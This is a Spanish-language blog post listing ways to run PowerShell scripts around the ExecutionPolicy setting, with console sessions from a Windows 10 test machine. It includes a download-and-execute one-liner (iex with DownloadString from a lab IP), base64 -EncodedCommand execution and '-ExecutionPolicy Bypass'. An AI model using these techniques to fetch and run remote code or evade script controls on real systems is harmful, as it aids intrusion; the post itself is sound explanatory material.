---
layout: post
title: Saltándose los controles de la Powershell
subtitle: Mecanismos de bypass para la PowerShell ExecutionPolicy
tags: [microsoft, powershell, security]
image: /img/powershell.png
---
En una de las charlas a las que acude con frecuencia -bueno, creo que en varias :)-, [Pablo González] estuvo explicando diferentes posibilidades para ejecutar scripts en PowerShell "saltándose" los controles de ejecución (ExecutionPolicy).

La [ExecutionPolicy] determina qué scripts PowerShell tienen autorización para ejecutarse en un sistema. Windows ofrece cuatro políticas:

| ExecutionPolicy | Descripción |
|------------|-----------|
| Restricted | No se puede ejecutar ningún script, la PowerShell solo se puede usar en modo interactivo |
| AllSigned | Solo se pueden ejecutar scripts firmados por una entidad de confianza |
| RemoteSigned | Los scripts descargados de internet deben estar formados por una entidad de confianza |
| Unrestricted | Todos los Windows PowerShell scripts se pueden ejecutar, sin restricción |
{: .table}

Por defecto la política suele ser "Restricted" o "RemoteSigned". Por ejemplo:

```powershell
PS C:\> get-executionpolicy -list
get-executionpolicy -list

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine      Restricted
```

Esto quiere decir que no vamos a poder ejecutar scripts no firmados. A ver si es verdad, creamos un script chorra y tratamos de ejecutarlo:

```powershell
PS C:\Users\IEUser> echo "Get-ChildItem" >foo.ps1
echo "Get-ChildItem" >foo.ps1

PS C:\Users\IEUser> ./foo.ps1
./foo.ps1
./foo.ps1 : File C:\Users\IEUser\foo.ps1 cannot be loaded because running scripts is disabled on this system. For more
information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ ./foo.ps1
+ ~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess
```

Llegados a este punto, hay que explicar que Microsoft no implementa la `ExecutionPolicy` como un mecanismo de seguridad, sino como un simple control para evitar la ejecución de scripts _inadvertidamente_:

[Windows PowerShell Script Security](https://technet.microsoft.com/en-us/gg261722.aspx)

> It may seem odd to permit users to override an administrator-established value for the execution policy, but remember that the execution policy is intended to help stop unintended script execution. It is not intended to stop skilled users from executing scripts at all, merely to ensure that they do not do so without knowing what they are doing.

Bien, aclarado esto vamos a saltarnos el "control". Supongamos que queremos ejecutar una serie de comandos para obtener información de una máquina; para que no sea muy largo nos limitaremos a esto:

```posh
PS C:\users\IEUser> Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | fl
Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | fl


Caption                 : Microsoft Windows 10 Enterprise Evaluation
InstallDate             : 7/21/2016 9:12:03 AM
ServicePackMajorVersion : 0
OSArchitecture          : 64-bit
BootDevice              : \Device\HarddiskVolume1
BuildNumber             : 14393
CSName                  : MSEDGEWIN10

PS C:\users\IEUser> Get-Hotfix
Get-Hotfix

Source        Description      HotFixID      InstalledBy          InstalledOn              
------        -----------      --------      -----------          -----------              
MSEDGEWIN10   Update           KB3199986     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
MSEDGEWIN10   Security Update  KB3202790     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
MSEDGEWIN10   Update           KB3201845     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
```

Almacenamos el "script" en un fichero Get-BasicInfo.ps1 e intentamos ejecutarlo. Y, claro, pasa lo que pasa:

```posh
PS C:\users\IEUser> ./Get-BasicInfo.ps1
./Get-BasicInfo.ps1
./Get-BasicInfo.ps1 : File C:\users\IEUser\Get-BasicInfo.ps1 cannot be loaded because running scripts is disabled on
this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ ./Get-BasicInfo.ps1
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess
```

Pues veamos algunas de las numerosas soluciones al _problema_:

* Table of Contents
{:toc}

## Copiar y pegar

Tal cual. Basta con copiar y pegar el contenido del script. Porque entonces ya no es un script, es _interactivo... :)_

## echo + pipe

Obtener el contenido del script con `echo`, `type` p similar (`Get-Content`, pasa ser más _posh_) y pasárselo vía pipe a... una powershell:

```posh
PS C:\users\ieuser> Get-Content Get-BasicInfo.ps1 | powershell -noprofile -
Get-Content Get-BasicInfo.ps1 | powershell -noprofile -
Cannot load PSReadline module.  Console is running without PSReadline.


Caption                 : Microsoft Windows 10 Enterprise Evaluation
InstallDate             : 7/21/2016 9:12:03 AM
ServicePackMajorVersion : 0
OSArchitecture          : 64-bit
BootDevice              : \Device\HarddiskVolume1
BuildNumber             : 14393
CSName                  : MSEDGEWIN10




Source        Description      HotFixID      InstalledBy          InstalledOn              
------        -----------      --------      -----------          -----------              
MSEDGEWIN10   Update           KB3199986     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
MSEDGEWIN10   Security Update  KB3202790     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
MSEDGEWIN10   Update           KB3201845     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM
```

## Descargar de URL + Invoke Expression

```posh
PS C:\users\ieuser> powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.254.0.1:8000/Get-BasicInfo.ps1')"
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.254.0.1:8000/Get-BasicInfo.ps1')"


Caption                 : Microsoft Windows 10 Enterprise Evaluation
InstallDate             : 7/21/2016 9:12:03 AM
ServicePackMajorVersion : 0
OSArchitecture          : 64-bit
BootDevice              : \Device\HarddiskVolume1
BuildNumber             : 14393
CSName                  : MSEDGEWIN10




Source        Description      HotFixID      InstalledBy          InstalledOn              
------        -----------      --------      -----------          -----------              
MSEDGEWIN10   Update           KB3199986     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
MSEDGEWIN10   Security Update  KB3202790     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
MSEDGEWIN10   Update           KB3201845     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM
```

## Argumento -command

Parecido a "copiar y pegar":

```posh
PS C:\users\ieuser> powershell -command "Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | fl
powershell -command "Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | fl
>> Get-Hotfix"

Caption                 : Microsoft Windows 10 Enterprise Evaluation
[...]
```

(Ya no pongo la salida más veces si no es estrictamente necesario)

## Argumento -encodedCommand

Esto viene directamente the [the NetSPI blog]. Es, de nuevo, "pegar" el contenido de nuestro script en una varible, codificarla en unicode/base64 -lo que evitaría problemas habituales del caso anterior- y ejecutarla mendiante `-encodedCommand`. Por ejemplo:

```posh
PS C:\Users\IEUser> $command="Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | fl
$command="Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | fl
>> Get-Hotfix"
Get-Hotfix"
>>
```

Codificamos:

```posh
PS C:\Users\IEUser> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)

PS C:\Users\IEUser> $encodedCommand = [Convert]::ToBase64String($bytes)
$encodedCommand = [Convert]::ToBase64String($bytes)

PS C:\Users\IEUser> $encodedCommand
$encodedCommand
RwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIABXAGkAbgAzADIAXwBPAHAAZQByAGEAdABpAG4AZwBTAHkAcwB0AGUAbQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAIABDAGEAcAB0AGkAbwBuACwAIABJAG4AcwB0AGEAbABsAEQAYQB0AGUALAAgAFMAZQByAHYAaQBjAGUAUABhAGMAawBNAGEAagBvAHIAVgBlAHIAcwBpAG8AbgAsACAATwBTAEEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlACwAIABCAG8AbwB0AEQAZQB2AGkAYwBlACwAIAAgAEIAdQBpAGwAZABOAHUAbQBiAGUAcgAsACAAQwBTAE4AYQBtAGUAIAB8ACAAZgBsAAoARwBlAHQALQBIAG8AdABmAGkAeAA=
```

Y ejecutamos:

```posh
PS C:\Users\IEUser> powershell.exe -EncodedCommand $encodedCommand
powershell.exe -EncodedCommand $encodedCommand
#< CLIXML


Caption                 : Microsoft Windows 10 Enterprise Evaluation
[...]
```

## El comando Invoke-Command

```posh
PS C:\Users\IEUser> invoke-command -scriptblock {Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | fl;echo;Get-Hotfix}
invoke-command -scriptblock {Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | fl;echo;Get-Hotfix}


Caption                 : Microsoft Windows 10 Enterprise Evaluation
[...]
```

## -ExecutionPolicy Bypass

Esta me parece cachondísima:

```posh
PS C:\Users\IEUser> PowerShell.exe -ExecutionPolicy Bypass -File Get-BasicInfo.ps1
PowerShell.exe -ExecutionPolicy Bypass -File Get-BasicInfo.ps1


Caption                 : Microsoft Windows 10 Enterprise Evaluation
[...]
```

## -ExecutionPolicy Unrestricted

Similar a la anterior, con sutiles diferencias esbozadas en [the NetSPI blog] o en la documentación de Microsoft:

* [But I ran Set-Executionpolicy unrestricted, what is going on?](https://blogs.technet.microsoft.com/christwe/2012/09/20/but-i-ran-set-executionpolicy-unrestricted-what-is-going-on/)
* [MSDN: About Execution Policies](https://msdn.microsoft.com/powershell/reference/5.1/Microsoft.PowerShell.Core/about/about_Execution_Policies)

## Cambiar ExecutionPolicy para este proceso en particular

La `ExecutionPolicy` puede ser distinta en distintos ámbitos; pues la cambiamos para este proceso de PowerShell:

```posh
PS C:\Users\IEUser> Get-ExecutionPolicy -list
Get-ExecutionPolicy -list

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser      Restricted
 LocalMachine      Restricted



PS C:\Users\IEUser> Set-ExecutionPolicy Unrestricted -Scope Process
Set-ExecutionPolicy Unrestricted -Scope Process

PS C:\Users\IEUser> ./Get-BasicInfo.ps1
./Get-BasicInfo.ps1


Caption                 : Microsoft Windows 10 Enterprise Evaluation
[...]
```

## Lo mismo para un usuario

```posh
PS C:\Users\IEUser> Set-ExecutionPolicy Unrestricted -Scope CurrentUser
```

Hay muchas otras formas, algunas creativas y originales, pero esto es más que suficiente. Queda suficientemente claro que Microsoft nunca entendió la `ExecutionPolicy` como un control de seguridad; de hecho, proporciona los mecanismos para sortearla.

[Pablo González]: https://twitter.com/pablogonzalezpe
[ExecutionPolicy]: https://technet.microsoft.com/es-ES/library/ee176961.aspx
[the NetSPI blog]: https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
